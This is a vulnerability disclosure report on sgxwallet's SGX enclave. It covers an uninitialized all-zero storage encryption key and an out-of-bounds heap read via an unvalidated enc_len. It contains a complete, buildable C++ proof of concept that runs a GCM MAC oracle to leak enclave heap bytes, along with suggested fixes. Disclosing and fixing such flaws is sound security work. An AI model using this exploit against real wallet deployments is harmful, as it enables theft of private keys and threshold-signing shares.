# Security Report: sgxwallet Zero-SEK and Out-of-Bounds Read Vulnerabilities

## Overview

This report documents two related vulnerabilities in [skalenetwork/sgxwallet](https://github.com/skalenetwork/sgxwallet). Both reside in the trusted enclave code (`secure_enclave`).

| ID | Vulnerability | CWE | Prerequisite |
|----|--------------|-----|-------------|
| 1 | Zero-SEK: uninitialized storage encryption key | CWE-665 | Malicious host skips SEK initialization |
| 2 | Out-of-bounds heap read via unvalidated `enc_len` | CWE-125 | Vulnerability 1 (zero-SEK) enables a byte-level oracle |

---

## Vulnerability 1: Zero-SEK — Use of Uninitialized Storage Encryption Key

**CWE:** CWE-665 (Improper Initialization)

### Root Cause

sgxwallet protects all private keys (BLS, ECDSA, DKG polynomials) inside the enclave with AES-128-GCM. The 16-byte encryption key (the "Storage Encryption Key", SEK) lives in a global array:

```c
// AESUtils.c:31
sgx_aes_gcm_128bit_key_t AES_key[1024];   // zero-initialized by C runtime
```

All encryption/decryption uses `AES_key[512]` as the 16-byte key:

```c
// AESUtils.c:76  (encrypt)
sgx_rijndael128GCM_encrypt(&(AES_key[512]), (uint8_t*)message, len, ...);

// AESUtils.c:127 (decrypt)
sgx_rijndael128GCM_decrypt(&(AES_key[512]), encrMessage + 28, len, ...);
```

The SEK must be populated at runtime by the host calling one of these ECALLs:

```
trustedGenerateSEK    — generate random SEK          (secure_enclave.c:275)
trustedSetSEK         — unseal previously sealed SEK  (secure_enclave.c:303)
trustedSetSEKBackup   — restore from backup hex       (secure_enclave.c:336)
```

**The problem:** The enclave never checks whether the SEK has been initialized. If the host skips this step, `AES_key[512]` remains `0x00 * 16`. All subsequent AES-GCM operations silently use this zero key — encryption and decryption succeed, MAC tags verify correctly, and no error is raised.

### Why This Is Dangerous

AES-GCM with key=0 is still *valid* AES-GCM. It produces pseudorandom-looking ciphertext and valid authentication tags. This means:

```
Normal enclave:     host → trustedGenerateSEK → random SEK → trustedCreateBlsKey → encrypted blob
                    Attacker CANNOT decrypt the blob (doesn't know SEK)

Zero-SEK enclave:   host → [skip SEK init] → trustedCreateBlsKey → encrypted blob
                    Attacker CAN decrypt the blob (key = 0x00*16, IV is in the blob)
```

The attack is **invisible** because:

- **Ciphertext looks random.** AES output with key=0 is still a pseudorandom function — the blobs stored in `sgx_data/` are indistinguishable from properly encrypted ones.
- **Remote attestation still passes.** Attestation verifies the enclave binary (MRENCLAVE), not the runtime state of `AES_key`. The zero-SEK enclave and the normal enclave have identical measurements.
- **Other protocol participants see valid signatures.** BLS/ECDSA private keys generated inside the enclave are still random (from `sgx_read_rand`). The signatures they produce are valid. Other nodes cannot tell the difference.

### Impact

A malicious host operator (e.g., a rogue validator in a threshold protocol) can:

1. **Decrypt all private keys offline.**

   Every encrypted key blob has the layout `[MAC(16)] [IV(12)] [ciphertext]`. With key = `0x00*16` and the IV from the blob, the attacker decrypts any BLS key, ECDSA key, or DKG polynomial using standard OpenSSL.

2. **Recover other participants' DKG secret shares.**

   During DKG, other participants encrypt secret shares using ECDH session keys. Decrypting these shares requires our ECDSA private key. With zero-SEK, the attacker extracts it:

   ```
   our_ECDSA_skey   = AES_decrypt(encrypted_skey, key=0)      // trivial
   session_key      = ECDH(our_ECDSA_skey, peer_ephemeral_pk) // DHDkg.c:146
   plaintext_share  = XOR(session_key, encrypted_share)        // DHDkg.c:286
   ```

   This recovers `f_i(j)` — the secret share that participant `i` sent to us. The entire derivation runs outside the enclave.

3. **Sign arbitrary messages without the enclave.**

   With plaintext BLS/ECDSA private keys, the attacker performs signing entirely in software, bypassing any enclave-side policy (rate limiting, message validation, etc.).

### Proof of Concept

```c
sgx_enclave_id_t eid;
sgx_create_enclave("secure_enclave.signed.so", ..., &eid);

// Step 1: Initialize enclave but SKIP SEK setup
trustedEnclaveInit(eid, 0);
// AES_key[512] = 0x00 * 16

// Step 2: Enclave encrypts a key — using zero key
int errStatus;
char errString[1024];
uint8_t encrypted_key[1024];
uint64_t enc_len;
trustedEncryptKey(eid, &errStatus, errString,
                  "deadbeefcafebabe1234567890abcdef"
                  "deadbeefcafebabe1234567890abcdef",
                  encrypted_key, &enc_len);
// errStatus == 0, encryption "succeeds" with key=0

// Step 3: Attacker decrypts OUTSIDE the enclave with key=0
//   Blob layout: [MAC 16B] [IV 12B] [ciphertext ...]
//   Use OpenSSL: EVP_aes_128_gcm, key=0x00*16, IV=blob[16..27]
//   → recovers plaintext private key
```

### Suggested Remediation

Add a global flag set only by `trustedGenerateSEK` / `trustedSetSEK` / `trustedSetSEKBackup`, and check it at the entry of every ECALL that uses `AES_encrypt` / `AES_decrypt`:

```c
static int sek_initialized = 0;

// In trustedGenerateSEK / trustedSetSEK / trustedSetSEKBackup:
sek_initialized = 1;

// In every other ECALL that uses AES_key:
if (!sek_initialized) {
    *errStatus = -1;
    snprintf(errString, BUF_LEN, "SEK not initialized");
    return;
}
```

---

## Vulnerability 2: Out-of-Bounds Read via Unvalidated `enc_len`

**CWE:** CWE-125 (Out-of-bounds Read)

### Root Cause

Several ECALLs accept a length parameter (`enc_len` or `key_len`) from the untrusted host and pass it directly to `AES_decrypt` without checking it against the actual buffer size.

The EDL-generated trusted proxy allocates each `encrypted_key` buffer with a **fixed size** from the EDL annotation:

```
// secure_enclave.edl:170
[in, count = TINY_BUF_SIZE] uint8_t* encrypted_key    // TINY_BUF_SIZE = 256
```

The proxy does: `_in_encrypted_key = malloc(256); memcpy(_in_encrypted_key, host_data, 256);`

But `enc_len` is a plain scalar — the proxy passes it through without validation:

```c
// secure_enclave.c:717  (inside trustedBlsSignMessage)
int status = AES_decrypt(encryptedPrivateKey, enc_len, key, BUF_LEN, &type, &exportable);
```

Inside `AES_decrypt`, this length determines how many bytes are read from the buffer:

```c
// AESUtils.c:120
uint64_t len = length - SGX_AESGCM_MAC_SIZE - SGX_AESGCM_IV_SIZE;  // = enc_len - 28

// AESUtils.c:127-128
sgx_rijndael128GCM_decrypt(&(AES_key[512]),
    encrMessage + 28, len,    // reads 'len' bytes starting at encrMessage+28
    ...);
```

When `enc_len` exceeds `buffer_size`, the decryption reads past the allocated buffer into adjacent enclave heap memory:

```
                    ◄── 256 bytes (allocated) ──►◄───── OOB (up to 796 bytes) ─────►
┌──────────┬──────┬─────────────────────────────┬─────────────────────────────────────┐
│ MAC (16) │IV(12)│   ciphertext (228 bytes)    │   adjacent heap memory (OOB)        │
└──────────┴──────┴─────────────────────────────┴─────────────────────────────────────┘
                  ◄────── sgx_rijndael128GCM_decrypt reads enc_len - 28 bytes ───────►
```

### Affected ECALLs

| ECALL | EDL buffer size | Ciphertext capacity | OOB window |
|-------|:-:|:-:|:-:|
| **`trustedBlsSignMessage`** | **256** (`TINY_BUF_SIZE`) | 228 | **796 bytes** |
| `trustedGetDecryptionShare` | 1024 (`SMALL_BUF_SIZE`) | 996 | 28 bytes |
| `trustedGetBlsPubKey` | 1024 | 996 | 28 bytes |
| `trustedEcdsaSign` | 1024 | 996 | 28 bytes |
| `trustedDecryptKey` | 1024 | 996 | 28 bytes |
| `trustedCreateBlsKey` | 1024 | 996 | 28 bytes |
| `trustedDkgVerify` | 1024 | 996 | 28 bytes |

`trustedBlsSignMessage` has the largest OOB window because its buffer is `TINY_BUF_SIZE` (256) while `AES_decrypt`'s effective range allows up to 1024.

### GCM MAC Oracle: Turning OOB Read into Byte-Level Leakage

The OOB read alone does not directly return data to the host — the read bytes are consumed internally by `sgx_rijndael128GCM_decrypt`. However, under the **zero-SEK** condition (Vulnerability 1), the attacker can construct a **byte-guessing oracle** using the GCM authentication tag.

**Key insight:** With SEK = `0x00*16`, the attacker knows the AES key. They control the IV and the in-buffer ciphertext. The only unknown is the OOB bytes. The GCM tag is a MAC over *all* decrypted data (in-buffer + OOB). By guessing each OOB byte and pre-computing the expected tag, the attacker can verify the guess via the ECALL's error status.

The oracle works as follows:

```
For each OOB byte position (0 to 795):
  For each candidate value (0x00 to 0xFF):

    1. Attacker constructs a 256-byte blob:
       [forged_tag(16)] [IV(12)] [known_ciphertext(228)]

    2. Attacker sets enc_len = 28 + 228 + (OOB_offset + 1)
       This makes AES_decrypt read into the OOB region up to the target byte.

    3. Attacker pre-computes the GCM tag that WOULD be correct IF the
       target OOB byte equals the candidate value.
       (All other inputs — key, IV, in-buffer ciphertext, previously
        confirmed OOB bytes — are known.)

    4. Attacker calls trustedBlsSignMessage(blob, enc_len, ...).

    5. Inside the enclave, sgx_rijndael128GCM_decrypt reads the buffer
       + OOB bytes and checks the tag.

    6. Attacker observes errStatus:
       - If tag matches → errStatus ≠ SGX_ERROR_MAC_MISMATCH → guess correct!
       - If tag mismatches → errStatus = SGX_ERROR_MAC_MISMATCH → try next value.

  Worst case: 256 ECALLs per byte.
  Expected: 128 ECALLs per byte on average.
```

### What Is in the OOB Window?

The OOB window reads 796 bytes of enclave heap memory physically adjacent to the `encrypted_key` chunk. What this memory contains depends on the heap state at the time of the ECALL, which is **not deterministic**.

The EDL-generated proxy allocates buffers via `malloc` in a fixed order:

```
malloc(4)            → errStatus       [out, memset 0]
malloc(256)          → err_string      [out, memset 0]
malloc(256)          → encrypted_key   [in, host data]   ← AES_decrypt reads from here
malloc(hashX_len)    → hashX           [in, host data]
malloc(hashY_len)    → hashY           [in, host data]
malloc(1024)         → signature       [out, memset 0]
```

However, `malloc` does not guarantee contiguous allocation. By the time `trustedBlsSignMessage` is called, the enclave heap has already been fragmented by `enclave_init` (which initializes libff alt_bn128 parameters, GMP, and secp256k1 curve data). The `malloc(256)` for `encrypted_key` may be served from a recycled free-list chunk whose physical neighbors are **not** the other proxy buffers, but rather:

- **dlmalloc chunk metadata** (`prev_size` + `size` fields at chunk boundaries)
- **Freed chunks** with stale data from prior allocations (e.g., libff/GMP internal objects from `enclave_init`, or proxy buffers from previous ECALLs)
- **Live allocations** from the enclave's internal libraries (libff curve parameters, GMP limb storage, etc.)
- **Other proxy buffers** from the same ECALL (if dlmalloc happens to place them adjacently)

The actual content of the OOB window is determined by the enclave's heap layout at runtime, which depends on the history of allocations and frees within that enclave instance.

### Proof of Concept

Build and run:

```bash
g++ -std=c++17 -O2 -g \
    -I${SGX_SDK}/include -I. \
    poc_bls_sign_oracle.cpp secure_enclave_u.o third_party/intel/oc_alloc.c \
    -lsgx_urts -lssl -lcrypto \
    -o poc_bls_sign_oracle

./poc_bls_sign_oracle [max_oob_bytes]   # default: 796
```

Full source (`poc_bls_sign_oracle.cpp`):

```c
// PoC: trustedBlsSignMessage 796-byte GCM MAC Oracle
//
// Demonstrates byte-level probing of enclave heap memory adjacent to
// the encrypted_key proxy buffer, using the zero-SEK condition.
//
// Oracle mechanism:
//   1. Attacker knows AES key (= 0x00*16) and controls IV + in-buffer ciphertext.
//   2. For each unknown OOB byte, attacker guesses a value, computes the expected
//      GCM tag, and calls trustedBlsSignMessage with enc_len extending into OOB.
//   3. If the guess matches the actual heap byte, GCM tag verification succeeds
//      (errStatus != SGX_ERROR_MAC_MISMATCH). Otherwise, tag mismatch.

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <sgx_urts.h>
#include "secure_enclave_u.h"

// ── Constants ────────────────────────────────────────────────────────────────
#define MAC_SIZE    16
#define IV_SIZE     12
#define BUF_256     256     // proxy-allocated encrypted_key size (EDL: TINY_BUF_SIZE)
#define CT_IN_BUF   (BUF_256 - MAC_SIZE - IV_SIZE)  // = 228 bytes of ciphertext in buffer
#define MAX_CT      1024    // AES_decrypt msgLen upper bound
#define MAX_OOB     (MAX_CT - CT_IN_BUF)             // = 796 bytes OOB window

#define TYPE_BLS        '2'
#define EXPORTABLE_FLAG '1'
#define ENCLAVE_FILE    "secure_enclave/secure_enclave.signed.so"

#define SGX_ERROR_MAC_MISMATCH 12289  // 0x3001

static const char ATTACKER_KEY_HEX[65] =
    "deadbeefcafebabe1234567890abcdef"
    "deadbeefcafebabe1234567890abcdef";

// ── OCall stubs ──────────────────────────────────────────────────────────────
void ocall_SGXWalletServer_log(int level, const char *msg) {
    (void)level; (void)msg;
}

// ── Compute AES-CTR keystream with key=0 ─────────────────────────────────────
static void compute_keystream(const uint8_t *key16, const uint8_t *iv,
                              uint8_t *keystream, int len) {
    uint8_t zeros[MAX_CT] = {0};
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    int outl = 0;
    EVP_EncryptInit_ex(ctx, EVP_aes_128_gcm(), NULL, NULL, NULL);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, IV_SIZE, NULL);
    EVP_EncryptInit_ex(ctx, NULL, NULL, key16, iv);
    EVP_EncryptUpdate(ctx, keystream, &outl, zeros, len);
    EVP_CIPHER_CTX_free(ctx);
}

// ── Compute GCM tag for a given ciphertext ───────────────────────────────────
static void compute_tag_for_ct(const uint8_t *key16, const uint8_t *iv,
                               const uint8_t *keystream,
                               const uint8_t *desired_ct, int ct_len,
                               uint8_t *out_tag) {
    // Recover plaintext: pt = ct ^ keystream
    uint8_t pt[MAX_CT];
    for (int i = 0; i < ct_len; i++)
        pt[i] = desired_ct[i] ^ keystream[i];

    // Re-encrypt to get the correct tag for this plaintext
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    uint8_t tmp[MAX_CT];
    int outl = 0;
    EVP_EncryptInit_ex(ctx, EVP_aes_128_gcm(), NULL, NULL, NULL);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, IV_SIZE, NULL);
    EVP_EncryptInit_ex(ctx, NULL, NULL, key16, iv);
    EVP_EncryptUpdate(ctx, tmp, &outl, pt, ct_len);
    EVP_EncryptFinal_ex(ctx, tmp + outl, &outl);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, MAC_SIZE, out_tag);
    EVP_CIPHER_CTX_free(ctx);
}

// ── main ─────────────────────────────────────────────────────────────────────
int main(int argc, char **argv) {
    int max_oob = MAX_OOB;
    if (argc > 1) max_oob = atoi(argv[1]);
    if (max_oob > MAX_OOB) max_oob = MAX_OOB;
    if (max_oob < 1) max_oob = 1;

    printf("=== PoC: trustedBlsSignMessage 796B GCM MAC Oracle ===\n");
    printf("    encrypted_key buffer: %d bytes\n", BUF_256);
    printf("    in-buffer ciphertext: %d bytes\n", CT_IN_BUF);
    printf("    OOB window: %d / %d bytes\n\n", max_oob, MAX_OOB);

    // ── Load enclave ─────────────────────────────────────────────────────────
    sgx_enclave_id_t eid = 0;
    sgx_launch_token_t token = {};
    int updated = 0;
    sgx_status_t st = sgx_create_enclave(
        ENCLAVE_FILE, SGX_DEBUG_FLAG, &token, &updated, &eid, NULL);
    if (st != SGX_SUCCESS) {
        fprintf(stderr, "[-] sgx_create_enclave failed: 0x%x\n", st);
        return 1;
    }
    printf("[+] Enclave loaded\n");

    // ── trustedEnclaveInit (but NOT trustedGenerateSEK → key stays 0) ────────
    st = trustedEnclaveInit(eid, 0);
    if (st != SGX_SUCCESS) {
        fprintf(stderr, "[-] trustedEnclaveInit failed: 0x%x\n", st);
        return 1;
    }
    printf("[+] trustedEnclaveInit done, AES_key = 0x00*16 (zero-SEK)\n");

    // ── Prepare oracle parameters ────────────────────────────────────────────
    uint8_t zero_key[16] = {0};
    uint8_t iv[IV_SIZE];
    RAND_bytes(iv, IV_SIZE);

    uint8_t keystream[MAX_CT];
    compute_keystream(zero_key, iv, keystream, MAX_CT);

    // Craft a valid BLS plaintext (type + exportable + 64-char hex key + null)
    uint8_t bls_pt[CT_IN_BUF] = {0};
    bls_pt[0] = TYPE_BLS;
    bls_pt[1] = EXPORTABLE_FLAG;
    memcpy(bls_pt + 2, ATTACKER_KEY_HEX, 64);
    bls_pt[66] = '\0';

    // Pre-compute in-buffer ciphertext (228 bytes)
    uint8_t base_ct[CT_IN_BUF];
    for (int i = 0; i < CT_IN_BUF; i++)
        base_ct[i] = bls_pt[i] ^ keystream[i];

    // hashX/hashY: must be valid alt_bn128 G1 point coordinates.
    // (0,0) causes division-by-zero crash in to_affine_coordinates().
    // (1,2) is the standard G1 generator for alt_bn128.
    char hashX[] = "1";
    char hashY[] = "2";

    // ── Baseline check: verify zero-SEK works ────────────────────────────────
    printf("\n[*] Baseline: testing zero-SEK AES_decrypt ...\n");
    {
        uint8_t blob[BUF_256] = {0};
        memcpy(blob + MAC_SIZE, iv, IV_SIZE);

        uint8_t pt67[67];
        pt67[0] = TYPE_BLS; pt67[1] = EXPORTABLE_FLAG;
        memcpy(pt67 + 2, ATTACKER_KEY_HEX, 64); pt67[66] = '\0';

        EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
        int outl = 0;
        EVP_EncryptInit_ex(ctx, EVP_aes_128_gcm(), NULL, NULL, NULL);
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, IV_SIZE, NULL);
        EVP_EncryptInit_ex(ctx, NULL, NULL, zero_key, iv);
        EVP_EncryptUpdate(ctx, blob + MAC_SIZE + IV_SIZE, &outl, pt67, 67);
        EVP_EncryptFinal_ex(ctx, blob + MAC_SIZE + IV_SIZE + outl, &outl);
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, MAC_SIZE, blob);
        EVP_CIPHER_CTX_free(ctx);

        int errStatus = -1;
        char errStr[256] = {0}, sig[1024] = {0};
        st = trustedBlsSignMessage(eid, &errStatus, errStr, blob,
                                   (uint64_t)(MAC_SIZE + IV_SIZE + 67),
                                   hashX, hashY, sig);
        printf("    sgx_status=0x%x errStatus=%d\n", st, errStatus);
        if (st != SGX_SUCCESS || errStatus == SGX_ERROR_MAC_MISMATCH) {
            fprintf(stderr, "[-] Baseline failed\n");
            return 1;
        }
        printf("[+] Baseline passed\n");
    }

    // ── Oracle main loop ─────────────────────────────────────────────────────
    printf("\n[*] Oracle: probing %d OOB bytes past encrypted_key[%d]\n",
           max_oob, BUF_256);
    printf("    Up to 256 ECALLs per byte, %d bytes total\n\n", max_oob);

    uint8_t *leaked = (uint8_t *)calloc(max_oob, 1);
    uint8_t *leaked_ok = (uint8_t *)calloc(max_oob, 1);
    int leaked_count = 0;
    int total_calls = 0;

    for (int pos = 0; pos < max_oob; pos++) {
        int ct_len = CT_IN_BUF + 1 + pos;  // in-buffer (228) + confirmed OOB + 1
        uint64_t key_len = (uint64_t)(ct_len + MAC_SIZE + IV_SIZE);

        // Build desired_ct template
        uint8_t desired_ct[MAX_CT];
        memcpy(desired_ct, base_ct, CT_IN_BUF);
        for (int k = 0; k < pos; k++)
            desired_ct[CT_IN_BUF + k] = leaked[k];

        int found = 0;
        for (int guess = 0; guess < 256; guess++) {
            desired_ct[CT_IN_BUF + pos] = (uint8_t)guess;

            // Compute expected GCM tag for this guess
            uint8_t tag[MAC_SIZE];
            compute_tag_for_ct(zero_key, iv, keystream,
                               desired_ct, ct_len, tag);

            // Assemble forged blob (256 bytes sent to enclave)
            uint8_t forge_blob[BUF_256];
            memcpy(forge_blob, tag, MAC_SIZE);
            memcpy(forge_blob + MAC_SIZE, iv, IV_SIZE);
            memcpy(forge_blob + MAC_SIZE + IV_SIZE, base_ct, CT_IN_BUF);

            int errStatus = -1;
            char errStr[256] = {0}, sig[1024] = {0};
            st = trustedBlsSignMessage(eid, &errStatus, errStr, forge_blob,
                                       key_len, hashX, hashY, sig);
            total_calls++;

            // Oracle condition: ECALL succeeded AND tag was accepted
            if (st == SGX_SUCCESS && errStatus != SGX_ERROR_MAC_MISMATCH) {
                leaked[pos] = (uint8_t)guess;
                leaked_ok[pos] = 1;
                leaked_count++;
                printf("  [+] +%03d: 0x%02x '%c'  (%d guesses, err=%d)\n",
                       pos, guess,
                       (guess >= 0x20 && guess < 0x7f) ? guess : '.',
                       guess + 1, errStatus);
                found = 1;
                break;
            }
        }

        if (!found) {
            printf("  [-] +%03d: no match (heap may be unstable)\n", pos);
            leaked[pos] = 0x00;
            leaked_ok[pos] = 0;
        }

        if ((pos + 1) % 50 == 0)
            printf("  --- progress: %d/%d, ECALLs: %d ---\n",
                   pos + 1, max_oob, total_calls);
    }

    // ── Results ──────────────────────────────────────────────────────────────
    printf("\n=== Results ===\n");
    printf("Total ECALLs: %d\n", total_calls);
    printf("Leaked: %d / %d bytes\n\n", leaked_count, max_oob);

    printf("Hex dump (offset relative to encrypted_key buffer start):\n");
    for (int i = 0; i < max_oob; i += 16) {
        printf("  +%04x |", BUF_256 + i);
        for (int j = 0; j < 16 && i + j < max_oob; j++) {
            if (leaked_ok[i + j])
                printf(" %02x", leaked[i + j]);
            else
                printf(" ??");
        }
        int rem = max_oob - i;
        if (rem < 16) for (int j = rem; j < 16; j++) printf("   ");
        printf("  |");
        for (int j = 0; j < 16 && i + j < max_oob; j++) {
            if (!leaked_ok[i + j]) { printf("?"); continue; }
            uint8_t c = leaked[i + j];
            printf("%c", (c >= 0x20 && c < 0x7f) ? c : '.');
        }
        printf("|\n");
    }

    printf("\nNon-zero regions:\n");
    int run_start = -1;
    for (int i = 0; i <= max_oob; i++) {
        int is_nonzero = (i < max_oob) && leaked_ok[i] && (leaked[i] != 0x00);
        if (is_nonzero && run_start < 0) {
            run_start = i;
        } else if (!is_nonzero && run_start >= 0) {
            int run_len = i - run_start;
            printf("  +0x%03x..+0x%03x (%3d bytes): ",
                   BUF_256 + run_start, BUF_256 + i - 1, run_len);
            for (int j = run_start; j < i && j < run_start + 32; j++)
                printf("%02x", leaked[j]);
            if (run_len > 32) printf("...");
            if (run_len >= 8 && (run_start % 8 == 0)) {
                uint64_t val = 0;
                memcpy(&val, leaked + run_start, 8);
                printf("  (u64: 0x%016lx)", (unsigned long)val);
            }
            printf("\n");
            run_start = -1;
        }
    }

    free(leaked);
    free(leaked_ok);
    sgx_destroy_enclave(eid);
    return 0;
}
```

### Suggested Remediation

Validate `enc_len` / `key_len` against the actual buffer size before calling `AES_decrypt`. This can be done either in each ECALL or centrally in `AES_decrypt`:

```c
// Option A: In each ECALL, before calling AES_decrypt
if (enc_len > TINY_BUF_SIZE) {    // or SMALL_BUF_SIZE, matching the EDL annotation
    *errStatus = -1;
    snprintf(errString, BUF_LEN, "enc_len exceeds buffer size");
    return;
}

// Option B: Add buffer size parameter to AES_decrypt
int AES_decrypt(uint8_t *encrMessage, uint64_t length, uint64_t bufSize, ...) {
    if (length > bufSize) return -7;  // reject
    ...
}
```

Additionally, consider aligning the EDL buffer size for `trustedBlsSignMessage`'s `encrypted_key` from `TINY_BUF_SIZE` (256) to `SMALL_BUF_SIZE` (1024) to match other ECALLs.

---

## Summary

| ID | Vulnerability | CWE | Prerequisite | Impact |
|----|--------------|-----|-------------|--------|
| 1 | Zero-SEK: uninitialized AES key | CWE-665 | Malicious host skips SEK init | Offline decryption of all keys; recovery of other participants' DKG shares; unauthorized signing; undetectable via attestation |
| 2 | OOB read via unvalidated `enc_len` | CWE-125 | Zero-SEK (for oracle) | Byte-level oracle probing up to 796 bytes of enclave heap via `trustedBlsSignMessage`; 28 bytes via other ECALLs |
